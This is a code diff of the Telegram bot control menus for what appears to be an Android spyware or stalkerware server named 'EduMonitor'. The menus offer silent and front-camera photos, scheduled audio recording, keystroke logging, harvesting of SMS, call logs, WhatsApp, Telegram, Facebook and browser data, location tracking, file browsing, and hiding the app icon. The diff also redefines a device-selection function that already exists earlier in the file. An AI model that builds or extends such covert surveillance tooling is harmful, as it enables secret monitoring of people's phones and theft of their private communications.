@@ -1266,215 +1266,513 @@ function getDeviceSelectionKeyboard(chatId) {
     return keyboard;
 }
 
-// ============= MENU KEYBOARDS =============
+// ============= COMPLETE INLINE MENU KEYBOARDS =============
+
+// Main Menu - Root level
 function getMainMenuKeyboard(chatId) {
     const activeDeviceId = userDeviceSelection.get(chatId);
     const activeDevice = activeDeviceId ? devices.get(activeDeviceId) : null;
     const deviceCount = getDeviceListForUser(chatId).length;
     
     let deviceStatus = `📱 ${deviceCount} device(s)`;
-    if (activeDevice) deviceStatus = `✅ ${activeDevice.deviceInfo?.model || 'Device'}`;
+    if (activeDevice) {
+        deviceStatus = `✅ ${activeDevice.deviceInfo?.model || 'Device'}`;
+    }
     
     return [
-        [{ text: '📸 Screenshot', callback_data: 'menu_screenshot' }, { text: '📷 Camera', callback_data: 'menu_camera' }],
-        [{ text: '🎤 Recording', callback_data: 'menu_recording' }, { text: '📍 Location', callback_data: 'cmd:location' }],
-        [{ text: '📊 Data', callback_data: 'menu_data' }, { text: '⚡ Real-time', callback_data: 'menu_realtime' }],
-        [{ text: 'ℹ️ Info', callback_data: 'menu_info' }, { text: '⚙️ System', callback_data: 'menu_system' }],
-        [{ text: deviceStatus, callback_data: 'menu_devices' }, { text: '❌ Close', callback_data: 'close_menu' }]
+        [
+            { text: "📸 Screenshot", callback_data: "menu_screenshot" },
+            { text: "📷 Camera", callback_data: "menu_camera" }
+        ],
+        [
+            { text: "🎤 Recording", callback_data: "menu_recording" },
+            { text: "📍 Location", callback_data: "cmd:location" }
+        ],
+        [
+            { text: "📊 Data", callback_data: "menu_data" },
+            { text: "⚡ Real-time", callback_data: "menu_realtime" }
+        ],
+        [
+            { text: "ℹ️ Info", callback_data: "menu_info" },
+            { text: "⚙️ System", callback_data: "menu_system" }
+        ],
+        [
+            { text: deviceStatus, callback_data: "menu_devices" },
+            { text: "❌ Close", callback_data: "close_menu" }
+        ]
     ];
 }
 
+// Screenshot Menu
 function getScreenshotMenuKeyboard() {
     return [
-        [{ text: '📸 Take Screenshot', callback_data: 'cmd:screenshot' }, { text: '▶️ Start Service', callback_data: 'cmd:start_screenshot' }],
-        [{ text: '⏹️ Stop Service', callback_data: 'cmd:stop_screenshot' }, { text: '🔄 Restart', callback_data: 'cmd:restart_screenshot' }],
-        [{ text: '⚙️ Settings', callback_data: 'menu_screenshot_settings' }, { text: '🎯 Target Apps', callback_data: 'menu_screenshot_targets' }],
-        [{ text: '🎨 Quality', callback_data: 'menu_screenshot_quality' }, { text: '🔑 Token', callback_data: 'menu_screenshot_token' }],
-        [{ text: '🔧 Check Accessibility', callback_data: 'cmd:check_accessibility' }, { text: '◀️ Back', callback_data: 'help_main' }]
+        [
+            { text: "📸 Take Screenshot", callback_data: "cmd:screenshot" },
+            { text: "▶️ Start Service", callback_data: "cmd:start_screenshot" }
+        ],
+        [
+            { text: "⏹️ Stop Service", callback_data: "cmd:stop_screenshot" },
+            { text: "🔄 Restart", callback_data: "cmd:restart_screenshot" }
+        ],
+        [
+            { text: "⚙️ Settings", callback_data: "menu_screenshot_settings" },
+            { text: "🎯 Target Apps", callback_data: "menu_screenshot_targets" }
+        ],
+        [
+            { text: "🎨 Quality", callback_data: "menu_screenshot_quality" },
+            { text: "🔑 Token", callback_data: "menu_screenshot_token" }
+        ],
+        [
+            { text: "🔧 Check Accessibility", callback_data: "cmd:check_accessibility" },
+            { text: "◀️ Back", callback_data: "help_main" }
+        ]
     ];
 }
 
+// Screenshot Settings Sub-menu
 function getScreenshotSettingsKeyboard() {
     return [
-        [{ text: '📊 Status', callback_data: 'cmd:screenshot_status' }, { text: '⚙️ Config', callback_data: 'menu_sched_config' }],
-        [{ text: '◀️ Back', callback_data: 'menu_screenshot' }]
+        [
+            { text: "📊 Status", callback_data: "cmd:screenshot_status" },
+            { text: "⚙️ Config", callback_data: "menu_sched_config" }
+        ],
+        [
+            { text: "◀️ Back", callback_data: "menu_screenshot" }
+        ]
     ];
 }
 
+// Screenshot Target Apps Sub-menu
 function getScreenshotTargetsKeyboard() {
     return [
-        [{ text: '➕ Add Target', callback_data: 'menu_add_target' }, { text: '❌ Remove Target', callback_data: 'menu_remove_target' }],
-        [{ text: '📱 List Targets', callback_data: 'cmd:target_apps' }, { text: '📋 Default Targets', callback_data: 'cmd:default_targets' }],
-        [{ text: '🔄 Reset Targets', callback_data: 'cmd:reset_targets' }, { text: '◀️ Back', callback_data: 'menu_screenshot' }]
+        [
+            { text: "➕ Add Target", callback_data: "menu_add_target" },
+            { text: "❌ Remove Target", callback_data: "menu_remove_target" }
+        ],
+        [
+            { text: "📱 List Targets", callback_data: "cmd:target_apps" },
+            { text: "📋 Default Targets", callback_data: "cmd:default_targets" }
+        ],
+        [
+            { text: "🔄 Reset Targets", callback_data: "cmd:reset_targets" },
+            { text: "◀️ Back", callback_data: "menu_screenshot" }
+        ]
     ];
 }
 
+// Screenshot Quality Sub-menu
 function getScreenshotQualityKeyboard() {
     return [
-        [{ text: '📏 Small (640x480, 60%)', callback_data: 'cmd:small' }],
-        [{ text: '📏 Medium (1280x720, 70%)', callback_data: 'cmd:medium' }],
-        [{ text: '📏 Original (Full res, 85%)', callback_data: 'cmd:original' }],
-        [{ text: '◀️ Back', callback_data: 'menu_screenshot' }]
+        [
+            { text: "📏 Small (640x480, 60%)", callback_data: "cmd:small" }
+        ],
+        [
+            { text: "📏 Medium (1280x720, 70%)", callback_data: "cmd:medium" }
+        ],
+        [
+            { text: "📏 Original (Full res, 85%)", callback_data: "cmd:original" }
+        ],
+        [
+            { text: "◀️ Back", callback_data: "menu_screenshot" }
+        ]
     ];
 }
 
+// Screenshot Token Sub-menu
 function getScreenshotTokenKeyboard() {
     return [
-        [{ text: '🔄 Refresh Token', callback_data: 'cmd:refresh_token' }, { text: '🔑 Token Status', callback_data: 'cmd:token_status' }],
-        [{ text: '◀️ Back', callback_data: 'menu_screenshot' }]
+        [
+            { text: "🔄 Refresh Token", callback_data: "cmd:refresh_token" },
+            { text: "🔑 Token Status", callback_data: "cmd:token_status" }
+        ],
+        [
+            { text: "◀️ Back", callback_data: "menu_screenshot" }
+        ]
     ];
 }
 
+// Schedule Config Sub-menu
 function getSchedConfigKeyboard() {
-    return [[{ text: '📅 Configure Schedule', callback_data: 'menu_configure_schedule' }], [{ text: '◀️ Back', callback_data: 'menu_screenshot_settings' }]];
+    return [
+        [
+            { text: "📅 Configure Schedule", callback_data: "menu_configure_schedule" }
+        ],
+        [
+            { text: "◀️ Back", callback_data: "menu_screenshot_settings" }
+        ]
+    ];
 }
 
+// Camera Menu
 function getCameraMenuKeyboard() {
     return [
-        [{ text: '📸 Take Photo', callback_data: 'cmd:photo' }, { text: '🔇 Silent Photo', callback_data: 'cmd:photo_silent' }],
-        [{ text: '👤 Front Camera', callback_data: 'cmd:camera_front' }, { text: '👥 Back Camera', callback_data: 'cmd:camera_back' }],
-        [{ text: '🔄 Switch Camera', callback_data: 'cmd:camera_switch' }, { text: '👤 Front Silent', callback_data: 'cmd:photo_front' }],
-        [{ text: '◀️ Back', callback_data: 'help_main' }]
+        [
+            { text: "📸 Take Photo", callback_data: "cmd:photo" },
+            { text: "🔇 Silent Photo", callback_data: "cmd:photo_silent" }
+        ],
+        [
+            { text: "👤 Front Camera", callback_data: "cmd:camera_front" },
+            { text: "👥 Back Camera", callback_data: "cmd:camera_back" }
+        ],
+        [
+            { text: "🔄 Switch Camera", callback_data: "cmd:camera_switch" },
+            { text: "👤 Front Silent", callback_data: "cmd:photo_front" }
+        ],
+        [
+            { text: "◀️ Back", callback_data: "help_main" }
+        ]
     ];
 }
 
+// Recording Menu
 function getRecordingMenuKeyboard() {
     return [
-        [{ text: '🎤 Start 60s', callback_data: 'cmd:start_60s_rec' }, { text: '⏹️ Stop', callback_data: 'cmd:stop_60s_rec' }],
-        [{ text: '⚙️ Settings', callback_data: 'menu_recording_settings' }, { text: '◀️ Back', callback_data: 'help_main' }]
+        [
+            { text: "🎤 Start 60s", callback_data: "cmd:start_60s_rec" },
+            { text: "⏹️ Stop", callback_data: "cmd:stop_60s_rec" }
+        ],
+        [
+            { text: "⚙️ Settings", callback_data: "menu_recording_settings" },
+            { text: "◀️ Back", callback_data: "help_main" }
+        ]
     ];
 }
 
+// Recording Settings Sub-menu
 function getRecordingSettingsKeyboard() {
     return [
-        [{ text: '📊 Info', callback_data: 'cmd:record_info' }, { text: '✅ Enable Schedule', callback_data: 'cmd:record_on' }],
-        [{ text: '❌ Disable Schedule', callback_data: 'cmd:record_off' }, { text: '⚙️ Custom Schedule', callback_data: 'menu_custom_schedule' }],
-        [{ text: '🎚️ Audio Quality', callback_data: 'menu_audio_quality' }, { text: '◀️ Back', callback_data: 'menu_recording' }]
+        [
+            { text: "📊 Info", callback_data: "cmd:record_info" },
+            { text: "✅ Enable Schedule", callback_data: "cmd:record_on" }
+        ],
+        [
+            { text: "❌ Disable Schedule", callback_data: "cmd:record_off" },
+            { text: "⚙️ Custom Schedule", callback_data: "menu_custom_schedule" }
+        ],
+        [
+            { text: "🎚️ Audio Quality", callback_data: "menu_audio_quality" },
+            { text: "◀️ Back", callback_data: "menu_recording" }
+        ]
     ];
 }
 
+// Audio Quality Sub-menu
 function getAudioQualityKeyboard() {
     return [
-        [{ text: '🎤 Ultra Low', callback_data: 'cmd:audio_ultra' }, { text: '🎤 Very Low', callback_data: 'cmd:audio_very_low' }],
-        [{ text: '🎤 Low', callback_data: 'cmd:audio_low' }, { text: '🎤 Medium', callback_data: 'cmd:audio_medium' }],
-        [{ text: '🎤 High', callback_data: 'cmd:audio_high' }, { text: '◀️ Back', callback_data: 'menu_recording_settings' }]
+        [
+            { text: "🎤 Ultra Low", callback_data: "cmd:audio_ultra" },
+            { text: "🎤 Very Low", callback_data: "cmd:audio_very_low" }
+        ],
+        [
+            { text: "🎤 Low", callback_data: "cmd:audio_low" },
+            { text: "🎤 Medium", callback_data: "cmd:audio_medium" }
+        ],
+        [
+            { text: "🎤 High", callback_data: "cmd:audio_high" },
+            { text: "◀️ Back", callback_data: "menu_recording_settings" }
+        ]
     ];
 }
 
+// Data Menu
 function getDataMenuKeyboard() {
     return [
-        [{ text: '📊 NEW Data', callback_data: 'menu_new_data' }, { text: '📊 ALL Data', callback_data: 'menu_all_data' }],
-        [{ text: '🔄 Sync & Harvest', callback_data: 'menu_sync_harvest' }, { text: '◀️ Back', callback_data: 'help_main' }]
+        [
+            { text: "📊 NEW Data", callback_data: "menu_new_data" },
+            { text: "📊 ALL Data", callback_data: "menu_all_data" }
+        ],
+        [
+            { text: "🔄 Sync & Harvest", callback_data: "menu_sync_harvest" },
+            { text: "◀️ Back", callback_data: "help_main" }
+        ]
     ];
 }
 
+// New Data Sub-menu (only unsynced data)
 function getNewDataKeyboard() {
     return [
-        [{ text: '📇 Contacts', callback_data: 'cmd:contacts' }, { text: '💬 SMS', callback_data: 'cmd:sms' }],
-        [{ text: '📞 Call Logs', callback_data: 'cmd:calllogs' }, { text: '📱 Apps', callback_data: 'cmd:apps_list' }],
-        [{ text: '⌨️ Keystrokes', callback_data: 'cmd:keys' }, { text: '🔔 Notifications', callback_data: 'cmd:notify' }],
-        [{ text: '📱 App Opens', callback_data: 'cmd:open_app' }, { text: '💬 WhatsApp', callback_data: 'cmd:whatsapp' }],
-        [{ text: '💬 Telegram', callback_data: 'cmd:telegram' }, { text: '💬 Facebook', callback_data: 'cmd:facebook' }],
-        [{ text: '🌐 Browser', callback_data: 'cmd:browser' }, { text: '◀️ Back', callback_data: 'menu_data' }]
+        [
+            { text: "📇 Contacts", callback_data: "cmd:contacts" },
+            { text: "💬 SMS", callback_data: "cmd:sms" }
+        ],
+        [
+            { text: "📞 Call Logs", callback_data: "cmd:calllogs" },
+            { text: "📱 Apps", callback_data: "cmd:apps_list" }
+        ],
+        [
+            { text: "⌨️ Keystrokes", callback_data: "cmd:keys" },
+            { text: "🔔 Notifications", callback_data: "cmd:notify" }
+        ],
+        [
+            { text: "📱 App Opens", callback_data: "cmd:open_app" },
+            { text: "💬 WhatsApp", callback_data: "cmd:whatsapp" }
+        ],
+        [
+            { text: "💬 Telegram", callback_data: "cmd:telegram" },
+            { text: "💬 Facebook", callback_data: "cmd:facebook" }
+        ],
+        [
+            { text: "🌐 Browser", callback_data: "cmd:browser" },
+            { text: "◀️ Back", callback_data: "menu_data" }
+        ]
     ];
 }
 
+// ALL Data Sub-menu (all data from database)
 function getAllDataKeyboard() {
     return [
-        [{ text: '📇 ALL Contacts', callback_data: 'cmd:contacts_all' }, { text: '💬 ALL SMS', callback_data: 'cmd:sms_all' }],
-        [{ text: '📞 ALL Call Logs', callback_data: 'cmd:calllogs_all' }, { text: '📱 ALL Apps', callback_data: 'cmd:apps_all' }],
-        [{ text: '⌨️ ALL Keystrokes', callback_data: 'cmd:keys_all' }, { text: '🔔 ALL Notifications', callback_data: 'cmd:notify_all' }],
-        [{ text: '💬 ALL WhatsApp', callback_data: 'cmd:whatsapp_all' }, { text: '💬 ALL Telegram', callback_data: 'cmd:telegram_all' }],
-        [{ text: '💬 ALL Facebook', callback_data: 'cmd:facebook_all' }, { text: '🌐 ALL Browser', callback_data: 'cmd:browser_all' }],
-        [{ text: '📍 Location', callback_data: 'cmd:location' }, { text: '🔍 Find Recorded', callback_data: 'cmd:find_recorded' }],
-        [{ text: '◀️ Back', callback_data: 'menu_data' }]
+        [
+            { text: "📇 ALL Contacts", callback_data: "cmd:contacts_all" },
+            { text: "💬 ALL SMS", callback_data: "cmd:sms_all" }
+        ],
+        [
+            { text: "📞 ALL Call Logs", callback_data: "cmd:calllogs_all" },
+            { text: "📱 ALL Apps", callback_data: "cmd:apps_all" }
+        ],
+        [
+            { text: "⌨️ ALL Keystrokes", callback_data: "cmd:keys_all" },
+            { text: "🔔 ALL Notifications", callback_data: "cmd:notify_all" }
+        ],
+        [
+            { text: "💬 ALL WhatsApp", callback_data: "cmd:whatsapp_all" },
+            { text: "💬 ALL Telegram", callback_data: "cmd:telegram_all" }
+        ],
+        [
+            { text: "💬 ALL Facebook", callback_data: "cmd:facebook_all" },
+            { text: "🌐 ALL Browser", callback_data: "cmd:browser_all" }
+        ],
+        [
+            { text: "📍 Location", callback_data: "cmd:location" },
+            { text: "🔍 Find Recorded", callback_data: "cmd:find_recorded" }
+        ],
+        [
+            { text: "◀️ Back", callback_data: "menu_data" }
+        ]
     ];
 }
 
+// Sync & Harvest Sub-menu
 function getSyncHarvestKeyboard() {
     return [
-        [{ text: '🔄 Sync All', callback_data: 'cmd:sync_all' }, { text: '⚡ Force Harvest', callback_data: 'cmd:force_harvest' }],
-        [{ text: '📊 Stats', callback_data: 'cmd:stats' }, { text: '📊 Logs Count', callback_data: 'cmd:logs_count' }],
-        [{ text: '🗑️ Clear Logs', callback_data: 'cmd:clear_logs' }, { text: '⚙️ Set Sync Interval', callback_data: 'menu_set_sync_interval' }],
-        [{ text: '◀️ Back', callback_data: 'menu_data' }]
+        [
+            { text: "🔄 Sync All", callback_data: "cmd:sync_all" },
+            { text: "⚡ Force Harvest", callback_data: "cmd:force_harvest" }
+        ],
+        [
+            { text: "📊 Stats", callback_data: "cmd:stats" },
+            { text: "📊 Logs Count", callback_data: "cmd:logs_count" }
+        ],
+        [
+            { text: "🗑️ Clear Logs", callback_data: "cmd:clear_logs" },
+            { text: "⚙️ Set Sync Interval", callback_data: "menu_set_sync_interval" }
+        ],
+        [
+            { text: "◀️ Back", callback_data: "menu_data" }
+        ]
     ];
 }
 
+// Real-time Menu
 function getRealtimeMenuKeyboard() {
     return [
-        [{ text: '🔑 Keys ON', callback_data: 'cmd:rt_keys_on' }, { text: '🔑 Keys OFF', callback_data: 'cmd:rt_keys_off' }],
-        [{ text: '🔔 Notif ON', callback_data: 'cmd:rt_notif_on' }, { text: '🔔 Notif OFF', callback_data: 'cmd:rt_notif_off' }],
-        [{ text: '✅ All ON', callback_data: 'cmd:rt_all_on' }, { text: '❌ All OFF', callback_data: 'cmd:rt_all_off' }],
-        [{ text: '📊 Status', callback_data: 'cmd:rt_status' }, { text: '◀️ Back', callback_data: 'help_main' }]
+        [
+            { text: "🔑 Keys ON", callback_data: "cmd:rt_keys_on" },
+            { text: "🔑 Keys OFF", callback_data: "cmd:rt_keys_off" }
+        ],
+        [
+            { text: "🔔 Notif ON", callback_data: "cmd:rt_notif_on" },
+            { text: "🔔 Notif OFF", callback_data: "cmd:rt_notif_off" }
+        ],
+        [
+            { text: "✅ All ON", callback_data: "cmd:rt_all_on" },
+            { text: "❌ All OFF", callback_data: "cmd:rt_all_off" }
+        ],
+        [
+            { text: "📊 Status", callback_data: "cmd:rt_status" },
+            { text: "◀️ Back", callback_data: "help_main" }
+        ]
     ];
 }
 
+// Info Menu
 function getInfoMenuKeyboard() {
     return [
-        [{ text: '📱 Device Info', callback_data: 'cmd:device_info' }],
-        [{ text: '🌐 Network Info', callback_data: 'cmd:network_info' }],
-        [{ text: '📱 Mobile Info', callback_data: 'cmd:mobile_info' }],
-        [{ text: '🏷️ Device Name', callback_data: 'menu_device_name' }],
-        [{ text: '◀️ Back', callback_data: 'help_main' }]
+        [
+            { text: "📱 Device Info", callback_data: "cmd:device_info" }
+        ],
+        [
+            { text: "🌐 Network Info", callback_data: "cmd:network_info" }
+        ],
+        [
+            { text: "📱 Mobile Info", callback_data: "cmd:mobile_info" }
+        ],
+        [
+            { text: "🏷️ Device Name", callback_data: "menu_device_name" }
+        ],
+        [
+            { text: "◀️ Back", callback_data: "help_main" }
+        ]
     ];
 }
 
+// Device Name Sub-menu
 function getDeviceNameKeyboard() {
     return [
-        [{ text: '📱 Show Name', callback_data: 'cmd:device_name' }, { text: '🔄 Reset Name', callback_data: 'cmd:reset_device_name' }],
-        [{ text: '◀️ Back', callback_data: 'menu_info' }]
+        [
+            { text: "📱 Show Name", callback_data: "cmd:device_name" },
+            { text: "🔄 Reset Name", callback_data: "cmd:reset_device_name" }
+        ],
+        [
+            { text: "◀️ Back", callback_data: "menu_info" }
+        ]
     ];
 }
 
+// System Menu
 function getSystemMenuKeyboard() {
     return [
-        [{ text: '📁 Media', callback_data: 'menu_media' }, { text: '📱 App Management', callback_data: 'menu_app_management' }],
-        [{ text: '📡 Data Saving', callback_data: 'menu_data_saving' }, { text: '🤖 Bot Token', callback_data: 'menu_bot_token' }],
-        [{ text: '◀️ Back', callback_data: 'help_main' }]
+        [
+            { text: "📁 Media", callback_data: "menu_media" },
+            { text: "📱 App Management", callback_data: "menu_app_management" }
+        ],
+        [
+            { text: "📡 Data Saving", callback_data: "menu_data_saving" },
+            { text: "🤖 Bot Token", callback_data: "menu_bot_token" }
+        ],
+        [
+            { text: "◀️ Back", callback_data: "help_main" }
+        ]
     ];
 }
 
+// Media Management Sub-menu
 function getMediaMenuKeyboard() {
     return [
-        [{ text: '🔍 Find Recorded', callback_data: 'cmd:find_recorded' }, { text: '🗑️ Clear Storage', callback_data: 'cmd:clear_storage' }],
-        [{ text: '✅ Enable Media Scan', callback_data: 'cmd:enable_media_scan' }, { text: '❌ Disable Media Scan', callback_data: 'cmd:disable_media_scan' }],
-        [{ text: '📊 Scan Status', callback_data: 'cmd:media_scan_status' }, { text: '➕ Add Scan Path', callback_data: 'menu_add_scan_path' }],
-        [{ text: '❌ Remove Scan Path', callback_data: 'menu_remove_scan_path' }, { text: '📋 List Paths', callback_data: 'cmd:list_scan_paths' }],
-        [{ text: '🗑️ Clear Paths', callback_data: 'cmd:clear_scan_paths' }, { text: '◀️ Back', callback_data: 'menu_system' }]
+        [
+            { text: "🔍 Find Recorded", callback_data: "cmd:find_recorded" },
+            { text: "🗑️ Clear Storage", callback_data: "cmd:clear_storage" }
+        ],
+        [
+            { text: "✅ Enable Media Scan", callback_data: "cmd:enable_media_scan" },
+            { text: "❌ Disable Media Scan", callback_data: "cmd:disable_media_scan" }
+        ],
+        [
+            { text: "📊 Scan Status", callback_data: "cmd:media_scan_status" },
+            { text: "➕ Add Scan Path", callback_data: "menu_add_scan_path" }
+        ],
+        [
+            { text: "❌ Remove Scan Path", callback_data: "menu_remove_scan_path" },
+            { text: "📋 List Paths", callback_data: "cmd:list_scan_paths" }
+        ],
+        [
+            { text: "🗑️ Clear Paths", callback_data: "cmd:clear_scan_paths" },
+            { text: "◀️ Back", callback_data: "menu_system" }
+        ]
     ];
 }
 
+// App Management Sub-menu
 function getAppManagementKeyboard() {
     return [
-        [{ text: '🔄 Reboot Services', callback_data: 'cmd:reboot_app' }, { text: '👻 Hide Icon', callback_data: 'cmd:hide_icon' }],
-        [{ text: '👁️ Show Icon', callback_data: 'cmd:show_icon' }, { text: '📁 Browse Files', callback_data: 'cmd:browse_files' }],
-        [{ text: '◀️ Back', callback_data: 'menu_system' }]
+        [
+            { text: "🔄 Reboot Services", callback_data: "cmd:reboot_app" },
+            { text: "👻 Hide Icon", callback_data: "cmd:hide_icon" }
+        ],
+        [
+            { text: "👁️ Show Icon", callback_data: "cmd:show_icon" },
+            { text: "📁 Browse Files", callback_data: "cmd:browse_files" }
+        ],
+        [
+            { text: "◀️ Back", callback_data: "menu_system" }
+        ]
     ];
 }
 
+// Data Saving Sub-menu
 function getDataSavingKeyboard() {
     return [
-        [{ text: '📡 WiFi-Only ON', callback_data: 'cmd:wifi_only_on' }, { text: '📡 WiFi-Only OFF', callback_data: 'cmd:wifi_only_off' }],
-        [{ text: '📊 Saving Status', callback_data: 'cmd:saving_status' }, { text: '◀️ Back', callback_data: 'menu_system' }]
+        [
+            { text: "📡 WiFi-Only ON", callback_data: "cmd:wifi_only_on" },
+            { text: "📡 WiFi-Only OFF", callback_data: "cmd:wifi_only_off" }
+        ],
+        [
+            { text: "📊 Saving Status", callback_data: "cmd:saving_status" },
+            { text: "◀️ Back", callback_data: "menu_system" }
+        ]
     ];
 }
 
+// Bot Token Sub-menu
 function getBotTokenKeyboard() {
     return [
-        [{ text: '🤖 Backup Status', callback_data: 'cmd:backup_status' }, { text: '🔄 Set Server Backup', callback_data: 'menu_set_server_backup' }],
-        [{ text: '🔄 Force Register', callback_data: 'cmd:force_register_complete' }, { text: '◀️ Back', callback_data: 'menu_system' }]
+        [
+            { text: "🤖 Backup Status", callback_data: "cmd:backup_status" },
+            { text: "🔄 Set Server Backup", callback_data: "menu_set_server_backup" }
+        ],
+        [
+            { text: "🔄 Force Register", callback_data: "cmd:force_register_complete" },
+            { text: "◀️ Back", callback_data: "menu_system" }
+        ]
     ];
 }
 
-function getAddTargetKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_targets' }]]; }
-function getRemoveTargetKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_targets' }]]; }
-function getAddScanPathKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_media' }]]; }
-function getRemoveScanPathKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_media' }]]; }
-function getConfigureScheduleKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_settings' }]]; }
-function getCustomScheduleKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_recording_settings' }]]; }
-function getSetSyncIntervalKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_sync_harvest' }]]; }
-function getSetServerBackupKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_bot_token' }]]; }
+// Devices Menu - Dynamic (shows actual devices)
+function getDeviceSelectionKeyboard(chatId) {
+    const userDevices = getDeviceListForUser(chatId);
+    const keyboard = [];
+    
+    userDevices.forEach(device => {
+        const status = device.isActive ? '✅ ' : '';
+        const onlineStatus = device.isOnline ? '🟢' : '🔴';
+        keyboard.push([{
+            text: `${status}${onlineStatus} ${device.name}`,
+            callback_data: `select_device:${device.id}`
+        }]);
+    });
+    
+    keyboard.push([
+        { text: "🔄 Refresh List", callback_data: "refresh_devices" },
+        { text: "📊 Device Stats", callback_data: "device_stats" }
+    ]);
+    keyboard.push([
+        { text: "◀️ Back to Main Menu", callback_data: "help_main" }
+    ]);
+    
+    return keyboard;
+}
 
+// Input prompt menus (for user input)
+function getAddTargetKeyboard() { 
+    return [[{ text: "◀️ Cancel", callback_data: "menu_screenshot_targets" }]]; 
+}
+
+function getRemoveTargetKeyboard() { 
+    return [[{ text: "◀️ Cancel", callback_data: "menu_screenshot_targets" }]]; 
+}
+
+function getAddScanPathKeyboard() { 
+    return [[{ text: "◀️ Cancel", callback_data: "menu_media" }]]; 
+}
+
+function getRemoveScanPathKeyboard() { 
+    return [[{ text: "◀️ Cancel", callback_data: "menu_media" }]]; 
+}
+
+function getConfigureScheduleKeyboard() { 
+    return [[{ text: "◀️ Cancel", callback_data: "menu_screenshot_settings" }]]; 
+}
+
+function getCustomScheduleKeyboard() { 
+    return [[{ text: "◀️ Cancel", callback_data: "menu_recording_settings" }]]; 
+}
+
+function getSetSyncIntervalKeyboard() { 
+    return [[{ text: "◀️ Cancel", callback_data: "menu_sync_harvest" }]]; 
+}
+
+function getSetServerBackupKeyboard() { 
+    return [[{ text: "◀️ Cancel", callback_data: "menu_bot_token" }]]; 
+}
 // ============= START SERVER =============
 async function startServer() {
     console.log('🚀 Starting EduMonitor Server...');
